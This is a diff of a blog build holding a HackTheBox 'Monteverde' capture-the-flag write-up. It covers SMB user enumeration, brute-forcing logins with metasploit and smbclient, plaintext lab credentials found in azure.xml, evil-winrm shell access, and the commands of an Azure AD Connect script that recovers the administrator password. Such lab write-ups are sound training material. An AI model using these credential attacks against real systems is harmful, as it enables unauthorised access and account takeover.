@@ -1,5 +1,78 @@
-<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> HackTheBox Monteverde Writeup </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="HackTheBox Monteverde Writeup" /> <meta name="keywords" content="HackTheBox Monteverde Writeup, rajatrao13, HackTheBox" /> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="rajatrao13" property="og:site_name" /> <meta content="HackTheBox Monteverde Writeup" property="og:title" /> <meta content="article" property="og:type" /> <meta content="HackTheBox Monteverde Writeup" property="og:description" /> <meta content="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/" property="og:url" /> <meta content="2020-06-05T15:22:20+05:30" property="article:published_time" /> <meta content="http://localhost:4000/about/" property="article:author" /> <meta content="http://localhost:4000/assets/img/posts/HTB/Monteverde/card.png" property="og:image" /> <meta content="HackTheBox" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="HackTheBox Monteverde Writeup" /> <meta name="twitter:url" content="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/" /> <meta name="twitter:description" content="HackTheBox Monteverde Writeup" /> <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.6.0/dist/instantsearch.min.css"> <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.6.0/dist/instantsearch-theme-algolia.min.css"> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="http://localhost:4000/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="http://localhost:4000/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="http://localhost:4000/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="http://localhost:4000/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="http://localhost:4000/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="http://localhost:4000/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="http://localhost:4000/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="http://localhost:4000/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.6.0/dist/instantsearch.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <!-- Netlify CMS --> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">rajatrao13</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/about" >About-Me</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link" id="search-icon" href="http://localhost:4000/search#/" ><i class="fa fa-search" aria-hidden="true"></i ></a> </li> <!-- <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li>--> </ul> </nav> <div class="col-lg-12"> <div class="row" id="blog-post-container"> <div class="col-lg-8 offset-md-2"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">HackTheBox Monteverde Writeup</h1> <h4 class="post-meta">HackTheBox Monteverde Writeup</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name">Rajat Rao</span> </span > at <time datetime="2020-06-05 15:22:20 +0530" itemprop="datePublished" >Jun 5, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/hackthebox/2020/06/05/HackTheBox-Monteverde/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/HackTheBox" >HackTheBox</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top" src="http://localhost:4000/assets/img/posts/HTB/Monteverde/card.png" alt="" /> <br /> <br /> <h2 id="brief">Brief</h2> <p>    On enumerating different services of <code class="highlighter-rouge">Monteverde</code> machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using <code class="highlighter-rouge">smb_login</code> module from <code class="highlighter-rouge">metasploit</code>. Levering the misconfiguration, we were able to login to <code class="highlighter-rouge">SMB</code> with the help of <code class="highlighter-rouge">smbclient</code> and on further enumeration, we were able to extract a file named <code class="highlighter-rouge">azure.xml</code> under <code class="highlighter-rouge">mhope</code> user folder consisting of credentails of the same user. Making the use of credential found, we were able to get <code class="highlighter-rouge">Windows Remote Management</code> shell with the help of tool named <code class="highlighter-rouge">evil-winrm</code> which targets on port <code class="highlighter-rouge">5985</code> port. Here, we were able to get basic shell and were able pwn the <code class="highlighter-rouge">user.txt</code> part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has <code class="highlighter-rouge">Azure Active Directory Connect</code>. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting <code class="highlighter-rouge">root.txt</code></p> <p> </p> <h2 id="flow">Flow</h2> <ul> <li> <p><code class="highlighter-rouge">enum4linux</code> reveals list of users name</p> </li> <li> <p>Brute Forcing <code class="highlighter-rouge">SMb</code> via <code class="highlighter-rouge">metasploit</code> using the usernames as password identifies a legit credential (<code class="highlighter-rouge">SABatchJobs:SABatchJobs</code>)</p> </li> <li> <p>Login as <code class="highlighter-rouge">SABatchJobs</code> in <code class="highlighter-rouge">SMB</code> via <code class="highlighter-rouge">smbcleint</code></p> </li> <li> <p>Enumerate <code class="highlighter-rouge">mhope</code> folder and download <code class="highlighter-rouge">azure.xml</code> which consists of mhope credentials (<code class="highlighter-rouge">mhope:4n0therD4y@n0th3r$</code>)</p> </li> <li> <p>Login as <code class="highlighter-rouge">mhope</code> in Win-RM Service (5985) using <code class="highlighter-rouge">evil-winrm</code></p> </li> <li> <p>Get <code class="highlighter-rouge">user.txt</code></p> </li> <li> <p>Local enumeramation discloses usage of <code class="highlighter-rouge">Azure AD Connect</code> in target machine</p> </li> <li> <p>Search for Azure AD exploit leads to powershell script (module) to generate new <code class="highlighter-rouge">administrator</code> password in the target machine</p> </li> <li> <p>Use newly generated <code class="highlighter-rouge">administrator</code> credentials and login as <code class="highlighter-rouge">administrator</code> in <code class="highlighter-rouge">Win-RM service</code> (5985) using <code class="highlighter-rouge">evil-winrm</code></p> </li> <li> <p>Get <code class="highlighter-rouge">root.txt</code></p> </li> </ul> <p> </p> <p>Below is a detail writeup of the machine following the below steps:</p> <ol> <li> <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering">Information Gathering</a></p> </li> <li> <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell">Low-Privilege Shell</a></p> </li> <li> <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion">Privilege Escalation</a></p> </li> </ol> <p id="informationgathering">&nbsp;</p> <h2 id="1-information-gathering">1. Information Gathering</h2> <p> </p> <h3 id="11--nmap">1.1 || Nmap</h3> <p>-&gt; <code class="highlighter-rouge">Run nmap</code></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ nmap -sC -sV -p- -oA full 10.10.10.172</span>
-</code></pre></div></div> <p>where,</p> <p>    -sC : Run Default Scripts</p> <p>    -sV : Enumerate different versions</p> <p>    -sC : Store the output in all format (.nmap, .xml and .gnmap) having name full</p> <p><strong>Result:</strong></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+I"��<h2 id="brief">Brief</h2>
+<p>    On enumerating different services of <code class="highlighter-rouge">Monteverde</code> machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using <code class="highlighter-rouge">smb_login</code> module from <code class="highlighter-rouge">metasploit</code>. Levering the misconfiguration, we were able to login to <code class="highlighter-rouge">SMB</code> with the help of <code class="highlighter-rouge">smbclient</code> and on further enumeration, we were able to extract a file named <code class="highlighter-rouge">azure.xml</code> under <code class="highlighter-rouge">mhope</code> user folder consisting of credentails of the same user. Making the use of credential found, we were able to get <code class="highlighter-rouge">Windows Remote Management</code> shell with the help of tool named <code class="highlighter-rouge">evil-winrm</code> which targets on port <code class="highlighter-rouge">5985</code> port. Here, we were able to get basic shell and were able pwn the <code class="highlighter-rouge">user.txt</code> part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has <code class="highlighter-rouge">Azure Active Directory Connect</code>. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting <code class="highlighter-rouge">root.txt</code></p>
+
+<p> </p>
+
+<h2 id="flow">Flow</h2>
+<ul>
+  <li>
+    <p><code class="highlighter-rouge">enum4linux</code> reveals list of users name</p>
+  </li>
+  <li>
+    <p>Brute Forcing <code class="highlighter-rouge">SMb</code> via <code class="highlighter-rouge">metasploit</code> using the usernames as password identifies a legit credential (<code class="highlighter-rouge">SABatchJobs:SABatchJobs</code>)</p>
+  </li>
+  <li>
+    <p>Login as <code class="highlighter-rouge">SABatchJobs</code> in <code class="highlighter-rouge">SMB</code> via <code class="highlighter-rouge">smbcleint</code></p>
+  </li>
+  <li>
+    <p>Enumerate <code class="highlighter-rouge">mhope</code> folder and download <code class="highlighter-rouge">azure.xml</code> which consists of mhope credentials (<code class="highlighter-rouge">mhope:4n0therD4y@n0th3r$</code>)</p>
+  </li>
+  <li>
+    <p>Login as <code class="highlighter-rouge">mhope</code> in Win-RM Service (5985) using <code class="highlighter-rouge">evil-winrm</code></p>
+  </li>
+  <li>
+    <p>Get <code class="highlighter-rouge">user.txt</code></p>
+  </li>
+  <li>
+    <p>Local enumeramation discloses usage of <code class="highlighter-rouge">Azure AD Connect</code> in target machine</p>
+  </li>
+  <li>
+    <p>Search for Azure AD exploit leads to powershell script (module) to generate new <code class="highlighter-rouge">administrator</code> password in the target machine</p>
+  </li>
+  <li>
+    <p>Use newly generated <code class="highlighter-rouge">administrator</code> credentials and login as <code class="highlighter-rouge">administrator</code> in <code class="highlighter-rouge">Win-RM service</code> (5985) using <code class="highlighter-rouge">evil-winrm</code></p>
+  </li>
+  <li>
+    <p>Get <code class="highlighter-rouge">root.txt</code></p>
+  </li>
+</ul>
+
+<p> </p>
+
+<p>Below is a detail writeup of the machine following the below steps:</p>
+
+<ol>
+  <li>
+    <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering">Information Gathering</a></p>
+  </li>
+  <li>
+    <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell">Low-Privilege Shell</a></p>
+  </li>
+  <li>
+    <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion">Privilege Escalation</a></p>
+  </li>
+</ol>
+
+<p id="informationgathering">&nbsp;</p>
+
+<h2 id="1-information-gathering">1. Information Gathering</h2>
+<p> </p>
+<h3 id="11--nmap">1.1 || Nmap</h3>
+
+<p>-&gt; <code class="highlighter-rouge">Run nmap</code></p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ nmap -sC -sV -p- -oA full 10.10.10.172</span>
+</code></pre></div></div>
+<p>where,</p>
+
+<p>    -sC : Run Default Scripts</p>
+
+<p>    -sV : Enumerate different versions</p>
+
+<p>    -sC : Store the output in all format (.nmap, .xml and .gnmap) having name full</p>
+
+<p><strong>Result:</strong></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="c1"># Nmap 7.80 scan initiated Tue May 26 14:02:41 2020 as: nmap -sC -sV -p- -oA full -Pn 10.10.10.172</span>
 <span class="s">Nmap scan report for 10.10.10.172</span>
 <span class="s">Host is up (0.13s latency).</span>
@@ -48,8 +121,21 @@
 <span class="s">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
 <span class="c1"># Nmap done at Tue May 26 14:14:49 2020 -- 1 IP address (1 host up) scanned in 728.28 seconds</span>
 
-</code></pre></div></div> <p> </p> <h3 id="12--enum4linux">1.2 || enum4linux</h3> <p><strong>Enum4linux</strong> is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.  </p> <p>-&gt; <code class="highlighter-rouge">Run enum4linux</code></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">enum4linux 10.10.10.172</span>
-</code></pre></div></div> <p><strong>Result:</strong></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">enum4linux 10.10.10.172</span>
+</code></pre></div></div>
+<p> </p>
+
+<h3 id="12--enum4linux">1.2 || enum4linux</h3>
+
+<p><strong>Enum4linux</strong> is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com. 
+ </p>
+
+<p>-&gt; <code class="highlighter-rouge">Run enum4linux</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">enum4linux 10.10.10.172</span>
+</code></pre></div></div>
+
+<p><strong>Result:</strong></p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">enum4linux 10.10.10.172</span>
 <span class="s">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 26 13:41:48 </span><span class="m">2020</span>
 
  <span class="s">==========================</span> 
@@ -271,8 +357,14 @@
 
 <span class="nv">enum4linux complete on Tue May 26 13</span><span class="pi">:</span><span class="nv">46</span><span class="pi">:</span><span class="nv">08 2020</span>
 
-</code></pre></div></div> <p>On examining the above output, we were able to identify usernames being revealed in the output. To get the list of users, we issued the following command:</p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">cat enum4linux | grep MEGABANK | cut -d ":" -f3 | cut -d '\' -f2 &gt; user_list.txt</span>
-</code></pre></div></div> <p><strong>Result</strong></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Guest</span>
+</code></pre></div></div>
+
+<p>On examining the above output, we were able to identify usernames being revealed in the output. To get the list of users, we issued the following command:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">cat enum4linux | grep MEGABANK | cut -d ":" -f3 | cut -d '\' -f2 &gt; user_list.txt</span>
+</code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Guest</span>
 <span class="s">dgalanos</span>
 <span class="s">roleary</span>
 <span class="s">Administrator</span>
@@ -291,9 +383,39 @@
 <span class="s">smorgan</span>
 <span class="s">Administrator</span>
 <span class="s">smorgan</span>
-</code></pre></div></div> <p> </p> <h3 id="13--smb-brute-force">1.3 || SMB Brute Force</h3> <p>As the list of usernames was extracted, we’ll be trying to brute force the SMB service using <strong><em>metasploit</em></strong>. Using <code class="highlighter-rouge">auxiliary/scanner/smb/smb_login</code> in metasploit and setting the options as shown in below screenshot:</p> <p><img src="/assets/img/posts/HTB/Monteverde/1.png" alt="deploy using travis" class="img-fluid" /></p> <p><img src="/assets/img/posts/HTB/Monteverde/2.png" alt="deploy using travis" class="img-fluid" /></p> <p> </p> <h3 id="14--smb-enumeration">1.4 || SMB Enumeration</h3> <p>On SMB Brute forcing to the target macine, we were successfully able to get a legit set of credentials. To enumrate SMB, we’ll be using <a href="">smbclient</a></p> <p><strong>Command Issued</strong></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/</span>
-</code></pre></div></div> <p><img src="/assets/img/posts/HTB/Monteverde/3.png" alt="deploy using travis" class="img-fluid" /></p> <p>On enumeration, we were able to access <code class="highlighter-rouge">users</code> sharename and find a file named <code class="highlighter-rouge">azure.xml</code> under <code class="highlighter-rouge">mhope</code> users folder consisting of password of the same user.</p> <p><strong>Command Issued</strong></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/users$</span>
-</code></pre></div></div> <p><img src="/assets/img/posts/HTB/Monteverde/4.png" alt="deploy using travis" class="img-fluid" /></p> <p><img src="/assets/img/posts/HTB/Monteverde/5.png" alt="deploy using travis" class="img-fluid" /></p> <p> </p> <h2 id="2-low-privilege-shell">2. Low-Privilege Shell</h2> <p>We were able get Win-RM (Low-privilege) shell with the help of credentials found in the ealier stage using a tool name <a href="">evil-winrm</a> and get <code class="highlighter-rouge">user.txt</code> accordingly.</p> <p><img src="/assets/img/posts/HTB/Monteverde/6.png" alt="deploy using travis" class="img-fluid" /></p> <p> </p> <h2 id="3-privilege-escalation">3. Privilege Escalation</h2> <h3 id="31--enumerate-local-system">3.1 || Enumerate local system</h3> <p>Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses <code class="highlighter-rouge">Azure AD</code>. On searching for exploits with respect to <code class="highlighter-rouge">Azure AD</code>, we were able to discover a script to create a new set of administrator credentials.</p> <p><img src="/assets/img/posts/HTB/Monteverde/7.png" alt="deploy using travis" class="img-fluid" /></p> <p>Uploading the script by using the upload functionality of evil-winrm and executing it by using the following steps and the scripts produces the administrator credentials:</p> <p><img src="/assets/img/posts/HTB/Monteverde/8.png" alt="deploy using travis" class="img-fluid" /></p> <p><strong>Command Issued</strong></p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">./Azure-ADConnect.ps1</span>
-<span class="s">import-module ./Azure-ADConnect.ps1</span>
-<span class="s">Azure-ADConnect -server 127.0.0.1 -db ADSync</span> 
-</code></pre></div></div> <p><img src="/assets/img/posts/HTB/Monteverde/9.png" alt="deploy using travis" class="img-fluid" /></p> <p> </p> <h3 id="32--privileged-shell">3.2 || Privileged Shell</h3> <p>Using the genrated credentials by the script (<code class="highlighter-rouge">administrator:d0m@in4adminyeah!</code>), we were able to get the highest level of privilege of the machine.</p> <p><img src="/assets/img/posts/HTB/Monteverde/10.png" alt="deploy using travis" class="img-fluid" /></p> <p> </p> <h3 id="33--roottxt">3.3 || root.txt</h3> <p><img src="/assets/img/posts/HTB/Monteverde/11.png" alt="deploy using travis" class="img-fluid" /></p> <h2 id="key-takeway">Key Takeway:</h2> <p>As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.</p> <p>For me, the key takeway was a reminder for basic routine check of security misconfiguration where the password of one the users were set as the username itself.</p> <br /> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/hackthebox/2020/06/05/HackTheBox-Monteverde"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Rajat Rao</div> <div class="card-body"> <p class="author_bio">Hi, my name is Rajat Rao. My professional IT career exapnds over 3 years as a Cyber Security Consultant.I am OSCP certified and I am an active user on HackTheBox. This site focuses on Information Security blogs and writeups.</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/sujaykundu777/devlopr-jekyll" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star sujaykundu777/devlopr-jekyll on GitHub">Star this Project</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#HackTheBox"></div> <li class="tag-head"> <a href="/blog/categories/HackTheBox">HackTheBox</a> </li> <a name="HackTheBox"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="http://localhost:4000/">Home</a> </li> <li> <a href="http://localhost:4000/blog">Blog</a> </li> <li> <a href="http://localhost:4000/about">About-Me</a> </li> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'my-class', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="http://localhost:4000/assets/js/mode-switcher.js"></script> </body> </html>
+</code></pre></div></div>
+<p> </p>
+
+<h3 id="13--smb-brute-force">1.3 || SMB Brute Force</h3>
+
+<p>As the list of usernames was extracted, we’ll be trying to brute force the SMB service using <strong><em>metasploit</em></strong>. Using <code class="highlighter-rouge">auxiliary/scanner/smb/smb_login</code> in metasploit and setting the options as shown in below screenshot:</p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/1.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/2.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h3 id="14--smb-enumeration">1.4 || SMB Enumeration</h3>
+
+<p>On SMB Brute forcing to the target macine, we were successfully able to get a legit set of credentials. To enumrate SMB, we’ll be using <a href="">smbclient</a></p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/3.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p>On enumeration, we were able to access <code class="highlighter-rouge">users</code> sharename and find a file named <code class="highlighter-rouge">azure.xml</code> under <code class="highlighter-rouge">mhope</code> users folder consisting of password of the same user.</p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/4.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/5.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<h2 id="2-low-privilege-shell">2. Low-Privilege Shell</h2>
+
+<p>We were able get Win-RM (Low-privilege) shell with the help of credentials found in the ealier stage using a tool name <a href="">evil-winrm</a> and get <code class="highlighter-rouge">user.txt</code> accordingly.</p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/6.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<h2 id="3-privilege-escalation">3. Privilege Escalation</h2>
+
+<p>Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses <code class="highlighter-rouge">Azure AD</code>. On searching for exploits with respect to <code class="highlighter-rouge">Azure AD</code>, we were able to disover a script to create a new set of credentials</p>
+
+:ET
